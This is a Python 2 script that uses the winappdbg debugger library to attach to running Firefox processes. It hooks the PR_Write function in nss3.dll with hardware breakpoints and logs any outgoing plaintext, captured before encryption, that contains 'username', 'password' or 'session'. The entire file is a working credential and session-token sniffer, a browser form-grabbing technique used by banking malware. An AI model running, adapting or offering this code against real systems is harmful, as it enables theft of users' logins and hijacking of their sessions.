import winappdbg

from winappdbg import Debug, EventHandler, EventSift

# File Descriptor Type for files
PR_DESC_FILE_TYPE = 1


class FirefoxHardHookEventHandler(EventHandler):

    patterns = ["username", "password", "session"]
    hooked_threads = set()
    pr_write_addr = None

    def create_process(self, event):
        process = event.get_process()
        module = process.get_module_by_name("nss3.dll")
        addr = module.resolve("PR_Write")
        if not addr:
            mylogger.log_text("could not hook PR_Write :(")
            return

        self.pr_write_addr = addr

    def create_thread(self, event):
        process = event.get_process()
        thread = event.get_thread()
        tid = thread.get_tid()
        pid = process.get_pid()

        if tid in self.hooked_threads:
            return

        event.debug.define_hardware_breakpoint(tid,
                                               self.pr_write_addr,
                                               triggerFlag=Debug.BP_BREAK_ON_EXECUTION,  # when address is executed (RIP)
                                               sizeFlag=Debug.BP_WATCH_BYTE,  # watch the individual byte
                                               condition=self._ignore_file_io)  # provide a condition to exclude files
        event.debug.enable_hardware_breakpoint(tid, self.pr_write_addr)  # have to enable it
        self.hooked_threads.add(tid)  # keep record of this thread
        #mylogger.log_text("hooked pid: [%d] thread: [%d] PR_Write" % (pid, tid))

    def exit_thread(self, event):
        pid = event.get_process().get_pid()
        tid = event.get_thread().get_tid()

        # if this thread was hooked remove it
        if tid in self.hooked_threads:
            self.hooked_threads.remove(tid)
            #mylogger.log_text("unhooked pid: [%d] thread: [%d] PR_Write" % (pid, tid))

    def _ignore_file_io(self, event):
        thread = event.get_thread()
        process = event.get_process()
        ptr_file_desc = thread.get_register("Rcx")  # 1st param fd
        # we're interested in the pointer to the IO methods struct
        # see https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR/Reference/PRFileDesc
        ptr_io_methods = process.read_qword(ptr_file_desc)
        # we only want the first field in the struct that tells us the method IO
        # see https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR/Reference/PRIOMethods
        file_type = process.read_dword(ptr_io_methods)
        # ignore file type FD
        return file_type != PR_DESC_FILE_TYPE

    def single_step(self, event):
        thread = event.get_thread()
        process = event.get_process()
        buffer = thread.get_register("Rdx")  # 2nd param buf
        size = thread.get_register("R8")  # 3rd param buf amount
        text = str(process.read(buffer, size))

        for pattern in self.patterns:
            if pattern in text:
                mylogger.log_text("-" * 50)
                mylogger.log_text(text)
                mylogger.log_text("-" * 50)


mylogger = winappdbg.Logger()
handler = EventSift(FirefoxHardHookEventHandler)

with Debug(handler, bKillOnExit=False) as debug:
    found_ff = False
    debug.system.scan()

    for (proc, name) in debug.system.find_processes_by_filename("firefox.exe"):
        pid = proc.get_pid()
        debug.attach(pid)
        print "[*] attached debugger to firefox: %d" % pid
        found_ff = True

    if found_ff:
        try:
            print "[*] monitoring CTRL-C to exit"
            debug.loop()
        except KeyboardInterrupt:
            print "[!] exiting..."
        finally:
            debug.stop()
    else:
        print "[!] could not find firefox process :("
